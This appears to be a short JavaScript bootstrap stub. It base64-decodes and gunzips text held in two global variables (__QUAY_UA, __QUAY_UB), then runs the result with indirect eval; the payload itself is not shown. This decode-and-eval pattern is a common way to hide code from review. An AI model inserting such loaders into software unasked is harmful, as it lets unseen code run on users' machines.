(async function(){
  var bin=atob(window.__QUAY_UA+window.__QUAY_UB);
  var bytes=new Uint8Array(bin.length);
  for(var i=0;i<bin.length;i++)bytes[i]=bin.charCodeAt(i);
  var ds=new DecompressionStream("gzip");
  var stream=new Response(bytes).body.pipeThrough(ds);
  var text=await new Response(stream).text();
  (0,eval)(text);
})();
